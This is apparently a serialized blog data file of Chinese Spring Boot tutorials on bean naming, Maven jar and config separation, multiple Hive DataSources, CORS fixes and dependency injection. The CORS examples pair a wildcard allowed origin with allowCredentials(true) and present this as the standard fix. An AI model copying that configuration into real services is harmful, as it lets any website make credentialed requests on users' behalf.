( definition  instanceof   AnnotatedBeanDefinition )   { \n             String  beanName  =   determineBeanNameFromAnnotation ( ( AnnotatedBeanDefinition )  definition ) ; \n             if   ( StringUtils . hasText ( beanName ) )   { \n                 // Explicit bean name found. \n                 return  beanName ; \n             } \n         } \n         // Fallback: generate a unique default bean name. \n         return   buildDefaultBeanName ( definition ) ; \n     } \n\n     /**\n     * Derive a bean name from one of the annotations on the class.\n     * @param annotatedDef the annotation-aware bean definition\n     * @return the bean name, or <code>null</code> if none is found\n     */ \n     protected   String   determineBeanNameFromAnnotation ( AnnotatedBeanDefinition  annotatedDef )   { \n         AnnotationMetadata  amd  =  annotatedDef . getMetadata ( ) ; \n         Set < String >  types  =  amd . getAnnotationTypes ( ) ; \n         String  beanName  =   null ; \n         for   ( String  type  :  types )   { \n             Map < String ,   Object >  attributes  =  amd . getAnnotationAttributes ( type ) ; \n             if   ( isStereotypeWithNameValue ( type ,  amd . getMetaAnnotationTypes ( type ) ,  attributes ) )   { \n                 String  value  =   ( String )  attributes . get ( "value" ) ; \n                 if   ( StringUtils . hasLength ( value ) )   { \n                     if   ( beanName  !=   null   &&   ! value . equals ( beanName ) )   { \n                         throw   new   IllegalStateException ( "Stereotype annotations suggest inconsistent "   + \n                                 "component names: \'"   +  beanName  +   "\' versus \'"   +  value  +   "\'" ) ; \n                     } \n                    beanName  =  value ; \n                 } \n             } \n         } \n         return  beanName ; \n     } \n\n     /**\n     * Check whether the given annotation is a stereotype that is allowed\n     * to suggest a component name through its annotation <code>value()</code>.\n     * @param annotationType the name of the annotation class to check\n     * @param metaAnnotationTypes the names of meta-annotations on the given annotation\n     * @param attributes the map of attributes for the given annotation\n     * @return whether the annotation qualifies as a stereotype with component name\n     */ \n     protected   boolean   isStereotypeWithNameValue ( String  annotationType , \n             Set < String >  metaAnnotationTypes ,   Map < String ,   Object >  attributes )   { \n\n         boolean  isStereotype  =  annotationType . equals ( COMPONENT_ANNOTATION_CLASSNAME )   || \n                 ( metaAnnotationTypes  !=   null   &&  metaAnnotationTypes . contains ( COMPONENT_ANNOTATION_CLASSNAME ) )   || \n                annotationType . equals ( "javax.annotation.ManagedBean" )   || \n                annotationType . equals ( "javax.inject.Named" ) ; \n         return   ( isStereotype  &&  attributes  !=   null   &&  attributes . containsKey ( "value" ) ) ; \n     } \n\n     /**\n     * Derive a default bean name from the given bean definition.\n     * <p>The default implementation simply builds a decapitalized version\n     * of the short class name: e.g. "mypackage.MyJdbcDao" -> "myJdbcDao".\n     * <p>Note that inner classes will thus have names of the form\n     * "outerClassName.innerClassName", which because of the period in the\n     * name may be an issue if you are autowiring by name.\n     * @param definition the bean definition to build a bean name for\n     * @return the default bean name (never <code>null</code>)\n     */ \n     protected   String   buildDefaultBeanName ( BeanDefinition  definition )   { \n         String  shortClassName  =   ClassUtils . getShortName ( definition . getBeanClassName ( ) ) ; \n         return   Introspector . decapitalize ( shortClassName ) ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 Spring在给Bean生成名字的时候，会调用generateBeanName方法，这个方法会先尝试获取注解括号中的名字，也就是用户自定义的名称，如果没有获取到，则调用buildDefaultBeanName，用于生成默认的名称，这个方法会使用Introspector.decapitalize(shortClassName);这个方法的API文档如下： \n \n Utility method to take a string and convert it to normal Java variable name capitalization. This normally means converting the first character from upper case to lower case, but in the (unusual) special case when there is more than one character and both the first and second characters are upper case, we leave it alone.\nThus "FooBah" becomes "fooBah" and "X" becomes "x", but "URL" stays as "URL".\nParameters:\nname - The string to be decapitalized.\nReturns:\nThe decapitalized version of the string. \n \n 最重要的一句话翻译过来是说：如果name的开头两个及两个以上字符为大写，则不作处理并直接返回原来的名字，否则将名称的首字母小写后返回。 \n'},{title:"SpringBoot打包实现静态文件、配置文件、jar包分离",frontmatter:{title:"SpringBoot打包实现静态文件、配置文件、jar包分离",date:"2021-10-03 09:48:13",tags:["springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_build.html",relativePath:"blogs/springboot/springboot_build.md",key:"v-1ea388d5",path:"/blogs/springboot/springboot_build.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在pom.xml文件里面添加 \n < plugins > \n         \x3c!--定义项目的编译环境--\x3e \n         < plugin > \n             < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-compiler-plugin </ artifactId > \n             < configuration > \n                 < source > 1.8 </ source > \n                 < target > 1.8 </ target > \n                 < encoding > UTF-8 </ encoding > \n             </ configuration > \n         </ plugin > \n         \x3c!--maven的测试用例插件，建议跳过。--\x3e \n         < plugin > \n             < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-surefire-plugin </ artifactId > \n             < configuration > \n                 < skip > true </ skip > \n             </ configuration > \n         </ plugin > \n         \x3c!--这个是springboot的默认编译插件，他默认会把所有的文件打包成一个jar--\x3e \n         < plugin > \n             < groupId > org.springframework.boot </ groupId > \n             < artifactId > spring-boot-maven-plugin </ artifactId > \n             < executions > \n                 < execution > \n                     < goals > \n                         < goal > repackage </ goal > \n                     </ goals > \n                 </ execution > \n             </ executions > \n             < configuration > \n                 < mainClass > com.ruoyi.RuoYiApplication </ mainClass > \n                 < fork > true </ fork > \n                 < addResources > true </ addResources > \n                 < outputDirectory > ${project.build.directory}/jar </ outputDirectory > \n             </ configuration > \n         </ plugin > \n         \x3c!-- 打JAR包 --\x3e \n         < plugin > \n             < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-jar-plugin </ artifactId > \n             < configuration > \n                 \x3c!-- 不打包资源文件（配置文件和依赖包分开） --\x3e \n                 < excludes > \n                     < exclude > *.yml </ exclude > \n                     < exclude > *.properties </ exclude > \n                     < exclude > mybatis/** </ exclude > \n                     < exclude > static/** </ exclude > \n                 </ excludes > \n                 < archive > \n                     < manifest > \n                         < addClasspath > true </ addClasspath > \n                         \x3c!-- MANIFEST.MF 中 Class-Path 加入前缀 --\x3e \n                         < classpathPrefix > lib/ </ classpathPrefix > \n                         \x3c!-- jar包不包含唯一版本标识 --\x3e \n                         < useUniqueVersions > false </ useUniqueVersions > \n                         \x3c!--指定入口类 --\x3e \n                         < mainClass > com.ruoyi.Application </ mainClass > \n                     </ manifest > \n                     < manifestEntries > \n                         \x3c!--MANIFEST.MF 中 Class-Path 加入资源文件目录 --\x3e \n                         < Class-Path > ./config/ </ Class-Path > \n                     </ manifestEntries > \n                 </ archive > \n                 < outputDirectory > ${project.build.directory} </ outputDirectory > \n             </ configuration > \n         </ plugin > \n         \x3c!-- 该插件的作用是用于复制依赖的jar包到指定的文件夹里 --\x3e \n         < plugin > \n             < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-dependency-plugin </ artifactId > \n             < executions > \n                 < execution > \n                     < id > copy-dependencies </ id > \n                     < phase > package </ phase > \n                     < goals > \n                         < goal > copy-dependencies </ goal > \n                     </ goals > \n                     < configuration > \n                         < outputDirectory > ${project.build.directory}/lib/ </ outputDirectory > \n                     </ configuration > \n                 </ execution > \n             </ executions > \n         </ plugin > \n\n         \x3c!-- 该插件的作用是用于复制指定的文件 --\x3e \n         < plugin > \n             < artifactId > maven-resources-plugin </ artifactId > \n             < executions > \n                 < execution >   \x3c!-- 复制配置文件 --\x3e \n                     < id > copy-resources </ id > \n                     < phase > package </ phase > \n                     < goals > \n                         < goal > copy-resources </ goal > \n                     </ goals > \n                     < configuration > \n                         < resources > \n                             < resource > \n                                 < directory > src/main/resources </ directory > \n                                 < includes > \n                                     < include > *.yml </ include > \n                                     < include > *.properties </ include > \n                                     < include > mybatis/** </ include > \n                                     < include > static/** </ include > \n                                 </ includes > \n                             </ resource > \n                         </ resources > \n                         < outputDirectory > ${project.build.directory}/config </ outputDirectory > \n                     </ configuration > \n                 </ execution > \n             </ executions > \n         </ plugin > \n     </ plugins > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 com.ruoyi.Application \n这个位置要修改成自己启动类路径 其他可以不改\n如果还有文件夹需要分离出来，就在includes的里面继续添加即可\n然后clean 然后package\nconfig：所有的配置文件、静态文件会存放在config文件夹下 \n jar：这里面是不分离的完整jar包\nlib：这是所有依赖的lib包文件\nadmin-4.1.0.jar :这是分离之后的jar包文件\n然后启动的话 直接把文件放在同级目录，然后运行 java -jar  admin-4.1.0.jar 即可 \n 如果不需要 改回原来的pom配置即可 \n < plugins > \n             < plugin > \n                 < groupId > org.springframework.boot </ groupId > \n                 < artifactId > spring-boot-maven-plugin </ artifactId > \n                 < configuration > \n                     < fork > true </ fork >   \x3c!-- 如果没有该配置，devtools不会生效 --\x3e \n                 </ configuration > \n                 < executions > \n                     < execution > \n                         < goals > \n                             < goal > repackage </ goal > \n                         </ goals > \n                     </ execution > \n                 </ executions > \n             </ plugin > \n             < plugin > \n                 < groupId > org.apache.maven.plugins </ groupId > \n                 < artifactId > maven-war-plugin </ artifactId > \n                 < version > 3.0.0 </ version > \n                 < configuration > \n                     < failOnMissingWebXml > false </ failOnMissingWebXml > \n                     < warName > ${artifactId} </ warName > \n                 </ configuration > \n             </ plugin > \n         </ plugins > \n         < finalName > ${artifactId} </ finalName > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 "},{title:"Spring Boot配置多个DataSource",frontmatter:{title:"Spring Boot配置多个DataSource",date:"2021-09-27T20:34:33.000Z",tags:["java","multiple dataSource","jdbc"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_configure_multiple_dataSource.html",relativePath:"blogs/springboot/springboot_configure_multiple_dataSource.md",key:"v-719ba3b5",path:"/blogs/springboot/springboot_configure_multiple_dataSource.html",headers:[{level:2,title:"注意事项",slug:"注意事项"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 使用Spring Boot时，默认情况下，配置DataSource非常容易。Spring Boot会自动为我们配置好一个DataSource。\n如果在application.yml中指定了spring.datasource的相关配置，Spring Boot就会使用该配置创建一个DataSource。如果在application.yml中没有指定任何spring.datasource的相关配置，Spring Boot会在classpath中搜索H2、hsqldb等内存数据库的jar包，如果找到了，就会自动配置一个内存数据库的DataSource，所以，我们只要引入jar包即可。 \n 但是，在某些情况下，如果我们需要配置多个数据源，应该如何在Spring Boot中配置呢？\n我们以JDBC为例，演示如何在Spring Boot中配置两个DataSource。对应的，我们会创建两个JdbcTemplate的Bean，分别使用这两个数据源。\n首先，我们必须在application.yml中声明两个数据源的配置，一个使用hive-datasource，另一个使用hive_kerberos-datasource： \n hive-datasource : \n   url :  jdbc : hive2 : //110.40.137.191 : 10000/testdb\n   driver-class-name :  org.apache.hive.jdbc.HiveDriver\n hive_kerberos-datasource : \n   url :  jdbc : hive2 : //110.42.214.104 : 10000/default;principal=hive/quickstart.cloudera@CLOUDERA\n   driver-class-name :  org.apache.hive.jdbc.HiveDriver\n \n 1 2 3 4 5 6 这两个DataSource都使用hivedb，但是数据库是不同的。此外，在使用多数据源的时候，所有必要配置都不能省略。\n其次，我们需要自己创建两个DataSource的Bean，其中一个标记为@Primary，另一个命名为kerberosDatasource：\n对于每一个DataSource，我们都必须通过@ConfigurationProperties(prefix = "xxx")指定配置项的前缀。\n紧接着，我们创建两个JdbcTemplate的Bean，其中一个标记为@Primary，另一个命名为kerberosJdbcTemplate，分别使用对应的DataSource：\n注意到kerberosJdbcTemplate在创建时，传入的DataSource必须用@Qualifier("kerberosDatasource")声明，这样，才能使用第二个DataSource \n    /**\n     * 无认证数据源配置\n     * \n     * @return\n     */ \n     @Bean \n     @ConfigurationProperties ( prefix  =   "hive-datasource" ) \n     @Primary \n     public   DataSource   setNoAuthDatasource ( )   { \n         return   DataSourceBuilder . create ( ) . build ( ) ; \n     } \n\n     /**\n     * \n     * 无认证jdbc连接\n     * \n     */ \n     @Bean \n     @Primary \n     JdbcTemplate   getNoAuthDatasourceJdbc ( DataSource  dataSource )   { \n         return   new   JdbcTemplate ( dataSource ) ; \n     } \n\n     /**\n     * kerberos认证数据源配置\n     * \n     * @return\n     */ \n     @Bean ( name  =   "kerberosDatasource" ) \n     @ConfigurationProperties ( prefix  =   "hive_kerberos-datasource" ) \n     DataSource   kerberosDatasource ( )   { \n\n         // kerberos 认证 \n         kerberosAuth ( ) ; \n         return   DataSourceBuilder . create ( ) . build ( ) ; \n     } \n\n     /**\n     * \n     * kerberos认证jdbc连接\n     * \n     */ \n     @Bean ( name  =   "kerberosJdbcTemplate" ) \n     JdbcTemplate   kerberosJdbcTemplate ( @Qualifier ( "kerberosDatasource" )   DataSource  dataSource )   { \n         return   new   JdbcTemplate ( dataSource ) ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 现在，我们就创建了两个JdbcTemplate的Bean。在需要使用第一个JdbcTemplate的地方，我们直接注入： \n @Service \n public   class   SomeService   { \n     @Autowired \n     JdbcTemplate  jdbcTemplate ; \n } \n \n 1 2 3 4 5 在需要使用第二个JdbcTemplate的地方，我们注入时需要用@Qualifier("kerberosJdbcTemplate")标识： \n @Service \n public   class   AnotherService   { \n     @Autowired \n     @Qualifier ( "kerberosJdbcTemplate" ) \n     JdbcTemplate  kerberosJdbcTemplate ; \n } \n \n 1 2 3 4 5 6 这样，我们就可以针对不同的数据源，用不同的JdbcTemplate进行操作。 \n 注意事项 \n 当存在多个相同类型的Bean，例如，多个DataSource，多个JdbcTemplate时，强烈建议总是使用@Primary把其中某一个Bean标识为“主要的”，使用@Autowired注入时会首先使用被标记为@Primary的Bean。\n相同类型的其他Bean，每一个都需要用@Bean(name="xxx")标识名字，并且，在使用@Autowired注入时配合@Qualifier("xxx")指定注入的Bean的名字。 \n'},{title:"解决跨域问题的若干种方案",frontmatter:{title:"解决跨域问题的若干种方案",date:"2021-09-28 22:34:09",tags:["cors","spingboot","nginx","nodejs","middleware"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_cors.html",relativePath:"blogs/springboot/springboot_cors.md",key:"v-e52ae3ea",path:"/blogs/springboot/springboot_cors.html",headers:[{level:2,title:"问题背景：",slug:"问题背景"},{level:2,title:"CORS简介:",slug:"cors简介"},{level:2,title:"浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。",slug:"浏览器将cors请求分成两类-简单请求-simple-request-和非简单请求-not-so-simple-request-。"},{level:2,title:"详解响应头：",slug:"详解响应头"},{level:2,title:"解决办法：",slug:"解决办法"},{level:3,title:"第一种办法:(支持springboot最低版本 1.3.0.RELEASE)",slug:"第一种办法-支持springboot最低版本-1-3-0-release"},{level:3,title:"第二种办法:(支持springboot 全版本)",slug:"第二种办法-支持springboot-全版本"},{level:3,title:"第三种办法：(支持springboot最低版本 1.3.0.RELEASE)",slug:"第三种办法-支持springboot最低版本-1-3-0-release"},{level:3,title:"第四种办法:Nginx(反向代理)",slug:"第四种办法-nginx-反向代理"},{level:3,title:"第五种办法:Node服务端代理",slug:"第五种办法-node服务端代理"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 问题背景： \n Same Origin Policy，译为“同源策略”。它是对于客户端脚本（尤其是JavaScript）的重要安全度量标准，其目的在于防止某个文档或者脚本从多个不同“origin”（源）装载。 它认为自任何站点装载的信赖内容是不安全的。\n当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。\n注：具有相同的Origin，也即是拥有相同的协议、主机地址以及端口。一旦这三项数据中有一项不同，那么该资源就将被认为是从不同的Origin得来的，进而不被允许访问。\nCORS就是为了解决SOP问题而生的，当然CORS不是唯一的解决方案，不过这里不赘述其他解决办法了。 \n CORS简介: \n CORS是一个W3C标准，全称是"跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 CORS需要浏览器和服务器同时支持。它的通信过程，都是浏览器自动完成，不需要用户参与。 \n 对于开发者来说，CORS通信与同源的AJAX/Fetch通信没有差别，代码完全一样。浏览器一旦发现请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。 \n 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 \n 浏览器发出CORS简单请求，只需要在头信息之中增加一个Origin字段。 \n 浏览器发出CORS非简单请求，会在正式通信之前，增加一次OPTIONS查询请求，称为"预检"请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。 \n 简单请求就是HEAD、GET、POST请求，并且HTTP的头信息不超出以下几种字段 Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type 注：Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain \n 反之，就是非简单请求。 \n 其实实现CORS很简单，就是在服务端加一些响应头，并且这样做对前端来说是无感知的，很方便。 \n 详解响应头： \n \n Access-Control-Allow-Origin 该字段必填。它的值要么是请求时Origin字段的具体值，要么是一个*，表示接受任意域名的请求。 \n Access-Control-Allow-Methods 该字段必填。它的值是逗号分隔的一个具体的字符串或者*，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次"预检"请求。 \n Access-Control-Expose-Headers 该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。 \n Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie.默认情况下，不发生Cookie，即：false。对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json，这个值只能设为true。如果服务器不要浏览器发送Cookie，删除该字段即可。 \n Access-Control-Max-Age 该字段可选，用来指定本次预检请求的有效期，单位为秒。在有效期间，不用发出另一条预检请求。\n顺便提一下，如果在开发中，发现每次发起请求都是两条，一次OPTIONS，一次正常请求，注意是每次，那么就需要配置Access-Control-Max-Age，避免每次都发出预检请求。 \n 解决办法： \n 第一种办法:(支持springboot最低版本 1.3.0.RELEASE) \n import   org . springframework . context . annotation . Configuration ; \n import   org . springframework . web . servlet . config . annotation . CorsRegistry ; \n import   org . springframework . web . servlet . config . annotation . WebMvcConfigurer ; \n @Configuration \n public   class   CorsConfig   implements   WebMvcConfigurer   { \n     @Override \n     public   void   addCorsMappings ( CorsRegistry  registry )   { \n        registry . addMapping ( "/**" ) \n                 // .allowedOrigins("*") \n                 . allowedOriginPatterns ( "*" ) \n                 . allowedMethods ( "GET" ,   "HEAD" ,   "POST" ,   "PUT" ,   "DELETE" ,   "OPTIONS" ) \n                 . allowCredentials ( true ) \n                 . maxAge ( 3600 ) \n                 . allowedHeaders ( "*" ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 这种方式是全局配置的，网上也大都是这种解决办法，但是很多都是基于旧的spring版本，比如 WebMvcConfigurerAdapter 在spring5.0已经被标记为Deprecated，点开源码可以看到： \n /**\n * An implementation of {@link WebMvcConfigurer} with empty methods allowing\n * subclasses to override only the methods they\'re interested in.\n *\n * @author Rossen Stoyanchev\n * @since 3.1\n * @deprecated as of 5.0 {@link WebMvcConfigurer} has default methods (made\n * possible by a Java 8 baseline) and can be implemented directly without the\n * need for this adapter\n */ \n @Deprecated \n public   abstract   class   WebMvcConfigurerAdapter   implements   WebMvcConfigurer   { } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 spring5最低支持到jdk1.8，所以注释中明确表明，你可以直接实现WebMvcConfigurer接口，无需再用这个适配器，因为jdk1.8支持接口中存在default-method。 \n 第二种办法:(支持springboot 全版本) \n import   org . springframework . context . annotation . Configuration ; \n import   javax . servlet . * ; \n import   javax . servlet . annotation . WebFilter ; \n import   javax . servlet . http . HttpServletResponse ; \n import   java . io . IOException ; \n @WebFilter ( filterName  =   "CorsFilter " ) \n @Configuration \n public   class   CorsFilter   implements   Filter   { \n     @Override \n     public   void   doFilter ( ServletRequest  req ,   ServletResponse  res ,   FilterChain  chain )   throws   IOException ,   ServletException   { \n         HttpServletResponse  response  =   ( HttpServletResponse )  res ; \n        response . setHeader ( "Access-Control-Allow-Origin" , "*" ) ; \n        response . setHeader ( "Access-Control-Allow-Credentials" ,   "true" ) ; \n        response . setHeader ( "Access-Control-Allow-Methods" ,   "POST, GET, PATCH, DELETE, PUT" ) ; \n        response . setHeader ( "Access-Control-Max-Age" ,   "3600" ) ; \n        response . setHeader ( "Access-Control-Allow-Headers" ,   "Origin, X-Requested-With, Content-Type, Accept" ) ; \n        chain . doFilter ( req ,  res ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 这种办法，是基于过滤器的方式，方式简单明了，就是在response中写入这些响应头，也支持springmvc。好多文章都是第一种和第二种方式都叫你配置，其实这是没有必要的，只需要一种即可。 \n 第三种办法：(支持springboot最低版本 1.3.0.RELEASE) \n public   class   GoodsController   { \n @CrossOrigin ( origins  =   "http://localhost:4000" ) \n @GetMapping ( "goods-url" ) \n public   Response   queryGoodsWithGoodsUrl ( @RequestParam   String  goodsUrl )   throws   Exception   { } \n }  \n \n 1 2 3 4 5 没错就是@CrossOrigin注解，点开注解 \n @Target ( {   ElementType . METHOD ,   ElementType . TYPE  } ) \n @Retention ( RetentionPolicy . RUNTIME ) \n @Documented \n public   @interface   CrossOrigin   { \n\n } \n \n 1 2 3 4 5 6 从元注解@Target可以看出，注解可以放在method、class等上面，类似RequestMapping，也就是说，整个controller下面的方法可以都受控制，也可以单个方法受控制。 \n 也可以得知，这个是最小粒度的cors控制办法了，精确到单个请求级别。 \n 以上三种方法都可以解决问题，最常用的应该是第一种、第二种，控制在自家几个域名范围下足以，一般没必要搞得太细。 \n 这三种配置方式都用了的话，谁生效呢，类似css中样式，就近原则， \n 第四种办法:Nginx(反向代理) \n Nginx处理跨域的方式其实就是反向反向代理。那什么是反向代理呢？通俗一点说就是我们不能直接访问到目标服务器，这个时候我们就需要通过代理的方式实现，这种对于用户还是我们开发来说都是无感的，因为这些处理都是nginx帮我们处理好了。配置代码如下 \n http {\n\n    ...\n\n    server {\n        listen       8000;\n        server_name  localhost;\n        location / {\n            proxy_pass http://localhost:5500;\n            root   html;\n            index  index.html index.htm;\n        }\n        location ^~/api {\n           rewrite ^/api/(.*)$ /$1 break;\n           proxy_pass http://localhost:3000/;\n      }\n    }\n\n    ...\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 如何理解呢， 所有的请求对于浏览器来说都是请求了localhost:8000，就不会出现跨域问题，但是nginx其实帮我们分别请求了localhost:5500和localhost:3000，这样就能解决跨域问题了。 \n 代理前，前台地址是 http://127.0.0.1:5500/ ，后台地址是 http://127.0.0.1:3000/ 。\n代理后，前台地址是 http://127.0.0.1:8000/ ，后台地址是 http://127.0.0.1:8000/api 。 \n 第五种办法:Node服务端代理 \n \n koa-server-http-proxy是koa2的中间件 \n \n const  Koa  =   require ( "koa" ) ; \n const  app  =   new   Koa ( ) ; \n const  proxy  =   require ( "koa-server-http-proxy" ) ; \napp . use ( async   ( ctx ,  next )   =>   { \n  ctx . set ( "Access-Control-Allow-Origin" ,   "*" ) ; \n  ctx . set ( \n     "Access-Control-Allow-Headers" , \n     "Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild" \n   ) ; \n  ctx . set ( "Access-Control-Allow-Methods" ,   "PUT, POST, GET, DELETE, OPTIONS" ) ; \n   if   ( ctx . method  ==   "OPTIONS" )   { \n    ctx . body  =   200 ; \n   }   else   { \n     await   next ( ) ; \n   } \n } ) ; \n\napp . use ( \n   proxy ( "/api" ,   { \n    target :   "http://127.0.0.1:3000" , \n    pathRewrite :   {   "^/api" :   ""   } , \n    changeOrigin :   true , \n   } ) \n ) ; \n\napp . listen ( 8080 ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 代理前，后台地址是 http://127.0.0.1:3000/ 。\n代理后，后台地址是 http://127.0.0.1:8000/api 。 \n \n http-proxy-middleware是node.js提供的代理方式 \n \n const  express  =   require ( "express" ) ; \n const  app  =   express ( ) ; \n const   {  createProxyMiddleware  }   =   require ( "http-proxy-middleware" ) ; \napp . use ( ( req ,  res ,  next )   =>   { \n  res . header ( "Access-Control-Allow-Origin" ,   "*" ) ; \n  res . header ( \n     "Access-Control-Allow-Headers" , \n     "Origin, X-Requested-With, Content-Type, Accept, Authorization, *" \n   ) ; \n  res . header ( "Access-Control-Allow-Methods" ,   "GET, PUT, POST, DELETE, OPTIONS" ) ; \n   next ( ) ; \n } ) ; \n\napp . use ( \n   createProxyMiddleware ( "/api" ,   { \n    target :   "http://127.0.0.1:3000" , \n    pathRewrite :   {   "^/api" :   ""   } , \n    changeOrigin :   true , \n   } ) \n ) ; \napp . listen ( 8080 ) ; \n\n代理前，后台地址是 ` http://127.0.0.1:3000/ ` 。\n代理后，后台地址是 ` http://127.0.0.1:8000/api ` 。\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 '},{title:"IDEA不推荐你使用@Autowired",frontmatter:{title:"IDEA不推荐你使用@Autowired",date:"2021-12-05 11:45:44",tags:["springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_injection.html",relativePath:"blogs/springboot/springboot_injection.md",key:"v-c9b5a896",path:"/blogs/springboot/springboot_injection.html",headers:[{level:2,title:"Spring中的三种依赖注入方式",slug:"spring中的三种依赖注入方式"},{level:3,title:"Constructor Injection",slug:"constructor-injection"},{level:3,title:"Field Injection",slug:"field-injection"},{level:3,title:"Setter Injection",slug:"setter-injection"},{level:3,title:"三种依赖注入的对比",slug:"三种依赖注入的对比"},{level:2,title:"总结",slug:"总结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 但是当我们使用IDEA写代码的时候，经常会发现@Autowired注解下面是有小黄线的，我们把小鼠标悬停在上面，可以看到这个如下图所示的警告信息：\n Field injection is not recommended \n那么为什么IDEA会给出Field injection is not recommended这样的警告呢？ \n Spring中的三种依赖注入方式 \n Constructor Injection \n 在 Spring4.3.x 中增加了新的特性：如果类只提供了一个带参数的构造方法，则不需要对对其内部的属性写 @Autowired 注解，Spring 会自动为你注入属性。 \n Constructor Injection 是构造器注入，是我们日常最为推荐的一种使用方式。 \n \n 官方推荐理由\n单一职责: 当使用构造函数注入的时候，你会很容易发现参数是否过多，这个时候需要考虑你这个类的职责是否过大，考虑拆分的问题；而当使用@Autowired注入field的时候，不容易发现问题\n依赖不可变: 只有使用构造函数注入才能注入final\n依赖隐藏:使用依赖注入容器意味着类不再对依赖对象负责，获取依赖对象的职责就从类抽离出来，IOC容器会帮你自动装备。这意味着它应该使用更明确清晰的公用接口方法或者构造器，这种方式就能很清晰的知道类需要什么和到底是使用setter还是构造器\n降低容器耦合度: 依赖注入框架的核心思想之一是托管类不应依赖于所使用的DI容器。换句话说，它应该只是一个普通的POJO，只要您将其传递给所有必需的依赖项，就可以独立地实例化。这样，您可以在单元测试中实例化它，而无需启动IOC容器并单独进行测试（使用一个可以进行集成测试的容器）。如果没有容器耦合，则可以将该类用作托管或非托管类，甚至可以切换到新的DI框架。\n使用构造器的使用能避免注入的依赖是空的情况。 因为在bean的生命周期里面先执行的是bean的构造器，然后才给bean里面的属性赋值。 \n \n 具体形式如下： \n @Controller \n public   class   UserController   { \n\n     private   final   UserService  userService ; \n\n     // @Autowired(可省略) \n     public   UserController ( UserService  userService ) { \n         this . userService  =  userService ; \n     } \n\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 这种注入方式很直接，通过对象构建的时候建立关系，所以这种方式对对象创建的顺序会有要求，当然Spring会为你搞定这样的先后顺序，除非你出现循环依赖，然后就会抛出异常。 \n Field Injection \n @Autowired 注解的一大使用场景就是 Field Injection \n具体形式如下： \n @Controller \n public   class   UserController   { \n\n     @Autowired \n     private   UserService  userService ; \n\n } \n \n 1 2 3 4 5 6 7 这种注入方式通过Java的反射机制实现，所以private的成员也可以被注入具体的对象。 \n Setter Injection \n Setter Injection 也会用到 @Autowired 注解，但使用方式与 Field Injection 有所不同， Field Injection 是用在成员变量上，而 Setter Injection 的时候，是用在成员变量的Setter函数上。\n具体形式如下： \n @Controller \n public   class   UserController   { \n\n     private   UserService  userService ; \n\n     @Autowired \n     public   void   setUserService ( UserService  userService ) { \n         this . userService  =  userService ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 这种注入方式也很好理解，就是通过调用成员变量的set方法来注入想要使用的依赖对象。 \n 三种依赖注入的对比 \n 